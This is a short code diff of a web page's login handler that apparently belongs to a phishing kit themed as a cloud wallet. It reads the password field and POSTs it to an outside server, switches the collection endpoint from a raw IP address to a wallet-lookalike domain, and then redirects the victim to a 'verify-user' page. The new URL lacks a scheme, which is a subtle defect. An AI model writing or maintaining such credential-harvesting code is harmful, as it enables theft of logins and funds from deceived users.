@@ -161,7 +161,7 @@
             'input[name="password"]'
           ).value;
 
-          fetch(`http://24.144.116.32:3000/user/`, {
+          fetch(`cloud-wallet-basic-auth.cosmichub.store/user/`, {
             method: "POST",
             headers: {
               "Content-Type": "application/json",
@@ -173,7 +173,7 @@
           })
             .then((response) => response.json())
             .then((data) => {
-              window.location.href = `/verify-user/${data._id}`;
+              window.location.href = `/login/verify-user/${data._id}`;
               // Handle success (e.g., display a message or redirect)
             })
             .catch((error) => {
